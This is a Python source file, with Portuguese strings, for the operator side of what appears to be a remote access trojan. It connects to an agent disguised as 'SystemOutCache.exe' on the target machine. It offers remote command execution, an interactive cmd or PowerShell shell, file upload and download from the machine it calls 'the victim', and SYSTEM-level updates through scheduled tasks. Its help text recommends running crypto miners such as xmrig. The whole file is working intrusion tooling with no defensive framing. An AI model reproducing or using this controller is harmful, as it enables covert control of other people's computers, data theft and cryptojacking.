#!/usr/bin/env python3
import socket
import time
import threading

PORT = 7722  # Porta fixa do servidor

# ==============================================================================
# NETWORK HELPERS
# ==============================================================================

def send_command(host, port, command):
    """Envia um comando ao servidor e retorna a resposta."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15)
            s.connect((host, port))
            s.sendall(command.encode('utf-8'))
            output = ""
            while True:
                data = s.recv(4096).decode('utf-8', errors='ignore')
                if not data: break
                output += data
                if '[PROCESS ENDED]' in data: break
            return output
    except ConnectionRefusedError:
        return "[ERRO] Não foi possível conectar ao servidor."
    except socket.timeout:
        return "[ERRO] Timeout: o servidor não respondeu a tempo."
    except Exception as e:
        return f"[ERRO] Falha na comunicação: {str(e)}"

def test_connection(host, port):
    """Testa se consegue conectar ao servidor"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            result = s.connect_ex((host, port))
            return result == 0
    except:
        return False



# ==============================================================================
# FILE TRANSFER HELPERS (PORT 7723)
# ==============================================================================
import struct
import os

def transfer_file_put(host, local_path, remote_path=None):
    """Envia arquivo para o servidor"""
    port = 7723
    if not os.path.exists(local_path):
        return "[ERRO] Arquivo local não encontrado."
    
    if not remote_path:
        remote_path = os.path.basename(local_path)

    try:
        file_size = os.path.getsize(local_path)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            
            # 1. Envia Header
            header = f"UPLOAD:{remote_path}"
            # Pad a header to 1024 bytes or just send it raw? Server reads 1024.
            # Server does: header_data = client.recv(1024).decode(...).strip()
            # If we send less, recv might block until it gets more or connection closes?
            # Wait, recv(1024) returns *up to* 1024. But if we send small packet, it returns fast.
            s.sendall(header.encode('utf-8'))
            
            # 2. Espera OK
            ack = s.recv(1024).decode()
            if ack != "OK":
                return f"[ERRO] Servidor recusou upload: {ack}"
            
            # 3. Envia Tamanho
            s.sendall(struct.pack('>I', file_size))
            
            # 4. Envia Payload com Barra de Progresso
            print(f"[UPLOAD] Enviando {local_path} ({file_size} bytes)...")
            sent = 0
            with open(local_path, 'rb') as f:
                while sent < file_size:
                    chunk = f.read(4096)
                    if not chunk: break
                    s.sendall(chunk)
                    sent += len(chunk)
                    # Simple progress
                    if file_size > 1024*1024:
                        print(f"\rProgresso: {sent*100//file_size}%", end='')
            
            if file_size > 1024*1024: print() # Newline
            
            # 5. Espera Confirmação Final
            final_ack = s.recv(1024).decode()
            return f"[SUCESSO] Upload concluído: {final_ack}"

    except Exception as e:
        return f"[ERRO] Falha no Upload: {e}"

def transfer_file_get(host, remote_path, local_path=None):
    """Baixa arquivo do servidor"""
    port = 7723
    if not local_path:
        local_path = os.path.basename(remote_path)
        # Se for a pasta raiz UPLOAD, salva como .zip
        if local_path.upper() == 'UPLOAD':
            local_path += '.zip'
        
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            
            # 1. Envia Header
            header = f"DOWNLOAD:{remote_path}"
            s.sendall(header.encode('utf-8'))
            
            # 2. Espera OK + Tamanho
            resp = s.recv(2) # "OK"
            if resp != b"OK":
                return f"[ERRO] Arquivo remoto não encontrado ou erro no servidor."
            
            size_data = s.recv(4)
            file_size = struct.unpack('>I', size_data)[0]
            
            print(f"[DOWNLOAD] Baixando {remote_path} ({file_size} bytes)...")
            
            # 3. Recebe Payload
            received = 0
            with open(local_path, 'wb') as f:
                while received < file_size:
                    chunk_size = min(4096, file_size - received)
                    data = s.recv(chunk_size)
                    if not data: break
                    f.write(data)
                    received += len(data)
                    # Simple progress
                    if file_size > 1024*1024:
                        print(f"\rProgresso: {received*100//file_size}%", end='')
            
            if file_size > 1024*1024: print()
            return f"[SUCESSO] Download salvo em: {local_path}"

    except Exception as e:
        return f"[ERRO] Falha no Download: {e}"

# ==============================================================================
# INTERACTIVE SHELL
# ==============================================================================

def start_shell(host, port, command):
    """Inicia um shell interativo remoto."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(None)
        s.connect((host, port))
        
        # Envia comando de inicialização
        msg = f"SHELL:{command}"
        s.sendall(msg.encode('utf-8'))
        
        print(f"\n[SHELL] Conectado ao processo remoto: {command}")
        print("=== USE 'Ctrl+C' PARA SAIR ===")
        print("--- Saída do Processo Abaixo ---")

        stop_event = threading.Event()

        def receive_loop():
            try:
                while not stop_event.is_set():
                    data = s.recv(1024)
                    if not data:
                        print("\n[!] Conexão fechada pelo servidor.")
                        stop_event.set()
                        break
                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
            except:
                stop_event.set()

        t_recv = threading.Thread(target=receive_loop)
        t_recv.daemon = True
        t_recv.start()

        # Loop de Envio (Main Thread)
        try:
            while not stop_event.is_set():
                try:
                    user_input = input() # Aguarda Enter
                    msg = user_input + "\n"
                    s.sendall(msg.encode('utf-8'))
                except EOFError: break
        except KeyboardInterrupt:
            print("\n[!] Interrompendo sessão...")
            stop_event.set()
        
        s.close()
        print("\n=== SESSÃO ENCERRADA ===")

    except Exception as e:
        print(f"[ERRO] Falha ao iniciar shell: {e}")
    
    input("Pressione ENTER para voltar ao console...")

def perform_update(host):
    """Realiza o update automático do agente"""
    print("\nXXX ATUALIZAÇÃO AUTOMÁTICA DO AGENTE XXX")
    print("Certifique-se que o novo 'SystemOutCache.exe' está nesta pasta.")
    
    if not os.path.exists("SystemOutCache.exe"):
        print("[ERRO] SystemOutCache.exe não encontrado localmente.")
        return
        
    confirm = input("Confirmar atualização e reinício do serviço remoto? (S/N): ")
    if confirm.upper() != 'S': return

    print("\n[1/2] Enviando novo executável...")
    if "SUCCESS" not in transfer_file_put(host, "SystemOutCache.exe"):
         return
         
    print("\n[2/2] Executando Update Remoto (Via Scheduler)...")
    
    # Truque do Scheduler para evitar que o script morra quando o serviço parar
    # Agendamos o Update.bat que JÁ EXISTE na raiz (C:\Windows\SystemOut\Update.bat)
    
    # 1. Cria a tarefa (Executa como SYSTEM)
    cmd_create = r'schtasks /Create /F /SC ONCE /ST 00:00 /TN "SystemUpdate" /TR "cmd.exe /c C:\Windows\SystemOut\Update.bat" /RL HIGHEST /RU SYSTEM'
    print(f"Criando tarefa: {send_command(host, 7722, 'EXEC:' + cmd_create)}")
    
    # 2. Executa a tarefa
    cmd_run = r'schtasks /Run /TN "SystemUpdate"'
    resp = send_command(host, 7722, 'EXEC:' + cmd_run)
    print(f"Disparando tarefa: {resp}")
    
    print("\n[INFO] Update agendado e disparado.")
    print("A conexão vai cair. O script 'SystemUpdate' vai parar o serviço e trocar o executável.")
    print("Aguarde 30s e tente reconectar.")
    input("Pressione ENTER para voltar...")

# ==============================================================================
# MENUS & UI
# ==============================================================================

def print_welcome():
    print("=" * 60)
    print("      CLIENTE DE CONTROLE REMOTO")
    print("=" * 60)

def print_help():
    print("\n" + "=" * 80)
    print("                 MANUAL DE COMANDOS")
    print("=" * 80)
    
    print("\n[1] COMANDOS DE EXECUÇÃO")
    print("-" * 80)
    print("  EXEC:<comando>           -> Executa, aguarda e retorna o TEXTO.")
    print("                              Ex: EXEC:ipconfig")
    print("                              Ex: EXEC:tasklist - Verifica as tarefas do Windows")
    print("                              Ex: EXEC:taskkill /PID 1234 /F - matar task com o numero PID")
    
    print("\n  START:<comando>          -> Dispara e esquece (Background). Retorna PID.")
    print("                              Ex: START:notepad.exe")
    print("                              Ideal para miners ou processos longos.")

    print("\n  SHELL:<comando>          -> Túnel Interativo (Seu melhor amigo).")
    print("                              Ex: SHELL:cmd.exe (Terminal Completo)")
    print("                              Ex: SHELL:powershell")
    print("                              Ex: SHELL: taskkill /F /IM chrome.exe - mata o chrome")
    
    print("\n  START:VISIBLE:<comando>  -> Abre na TELA DA VÍTIMA (Sessão 1).")
    print("                              Ex: START:VISIBLE:chrome.exe")

    print("\n  START:VISIBLE:<comando>  -> Abre na TELA DA VÍTIMA (Sessão 1).")
    print("                              Ex: START:VISIBLE:chrome.exe")

    print("\n[2] TRANSFERÊNCIA DE ARQUIVOS (PORTA 7723)")
    print("-" * 80)
    print("  PUT <nome do arquivo>            -> Envia arquivo local para a vítima (Pasta UPLOAD).")
    print("  GET <nome do arquivo>            -> Baixa arquivo da vítima.")
    print("  GET UPLOAD               -> Baixa TODA a pasta UPLOAD zipada.")

    print("\n[3] GERENCIAMENTO DE PROCESSOS")
    print("-" * 80)
    print("  LIST                     -> Lista processos iniciados pelo Agente.")
    print("  STOP:<id>                -> Para o processo pelo ID da lista.")
    print("                              ATENÇÃO: Se for um script (.bat), o programa filho")
    print("                              pode continuar rodando (zumbi).")
    print()
    print("  STOPNAME:<nome>          -> O 'Matador'. Mata TODOS com esse nome.")
    print("                              Ex: STOPNAME:xmrig  (Recomendado para limpar tudo)")
    print("                              Ex: STOPNAME:chrome")
    print()
    print("  FIND:<nome>              -> Procura PIDs rodando no sistema.")
    print("  PROCESSES                -> Lista TUDO (Pesado).")
    print()
    print("\n[3] DICAS DE OURO (SHELL INTERATIVO)")
    print("-" * 80)
    print("  Com 'SHELL:cmd.exe', você tem o controle total:")
    print("  * Ler arquivos    : type C:\\Windows\\SystemOut\\config.json")
    print("  * Criar arquivos  : echo 123 > C:\\teste.txt")
    print("  * Scripts         : call C:\\script.bat")
    print("  * PowerShell      : Digite 'powershell' dentro do shell para comandos avançados")
    print("                      (Ex: Set-Content, Add-Content)")
    
    print("\n  OBS: Erros de conexão (WinError 10054) ao fechar o Shell são normais.")
    print("       Significa apenas que o processo remoto morreu.")
    
    print("=" * 80)
    input("\nPressione ENTER para voltar...")

def command_console(host):
    print(f"\n[CONSOLE] Conectado a {host}. Digite '/menu' ou /help")
    
    while True:
        try:
            cmd = input(f"\n> ").strip()
            
            if not cmd: continue
            if cmd.lower() == '/menu':
                break
            
            if cmd.lower() == '/help':
                print("Comandos: EXEC:<comando>, START:<comando>, SHELL:<comando>, LIST, STOP:id")
                continue

            # --- SHELL MODE ---
            if cmd.upper().startswith("SHELL:"):
                target = cmd[6:].strip()
                if target:
                    start_shell(host, PORT, target)
                else:
                    print("Erro: Digite o comando. Ex: SHELL:cmd.exe")
                continue

            # --- FILE TRANSFER MODE (PUT/GET) ---
            if cmd.upper().startswith("PUT "):
                # Sintaxe: PUT local [remote]
                parts = cmd.split()
                if len(parts) < 2:
                    print("Uso: PUT <arquivo_local> [nome_remoto]")
                    continue
                local_f = parts[1]
                remote_f = parts[2] if len(parts) > 2 else None
                print(transfer_file_put(host, local_f, remote_f))
                continue

            if cmd.upper().startswith("GET "):
                # Sintaxe: GET remote [local]
                parts = cmd.split()
                if len(parts) < 2:
                    print("Uso: GET <arquivo_remoto> [nome_local]")
                    continue
                remote_f = parts[1]
                local_f = parts[2] if len(parts) > 2 else None
                print(transfer_file_get(host, remote_f, local_f))
                continue

            # --- STANDARD COMMAND ---
            start_t = time.time()
            resp = send_command(host, PORT, cmd)
            duration = time.time() - start_t
            
            print("-" * 40)
            print(resp.strip())
            print("-" * 40)
            if duration > 1.0: print(f"(Tempo: {duration:.2f}s)")

        except KeyboardInterrupt:
            print("\n")
            break

# ==============================================================================
# MAIN FLOW
# ==============================================================================

def main():
    current_host = None
    
    # Auto-detect IP from input args or default? No, user wants menu.
    
    while True:
        # Clear screen simulation? No, just print breaks.
        print("\n" * 2) 
        print_welcome()
        if current_host:
            print(f"   STATUS: CONECTADO [{current_host}]")
        else:
            print(f"   STATUS: DESCONECTADO")
        print("-" * 60)
        print("1 - Conectar IP")
        if current_host:
            print("2 - Console de Comandos")
        else:
            print("2 - Console de Comandos (Requer Conexão)")
        print("3 - Ajuda / Explicação dos Comandos")

        if current_host:
            print("5 - ATUALIZAR AGENTE (Upload + Restart)")
        print("4 - Sair")
        print("-" * 60)
        
        opt = input("Opção: ").strip()
        
        if opt == '1':
            new_host = input("Digite IP do Servidor (Enter para localhost): ").strip()
            if not new_host: new_host = 'localhost'
            print(f"Testando conexão com {new_host}...")
            if test_connection(new_host, PORT):
                current_host = new_host
                print(f"[SUCESSO] Conectado a {current_host}")
                time.sleep(1)
            else:
                print(f"[ALERTA] Não foi possível contactar {new_host}. Verifique IP/Firewall.")
                current_host = None  # Reset if failed? Or keep trying? User preference. Let's reset to be safe.
                input("Enter para continuar...")

        elif opt == '2':
            if not current_host:
                print(" [!] Defina o IP na opção 1 primeiro.")
                time.sleep(1)
            else:
                command_console(current_host)

        elif opt == '3':
            print_help()
            
        elif opt == '5' and current_host:
            perform_update(current_host)

        elif opt == '4':
            print("Saindo...")
            break
            
        else:
            print("Opção inválida.")
            time.sleep(0.5)

if __name__ == "__main__":
    main()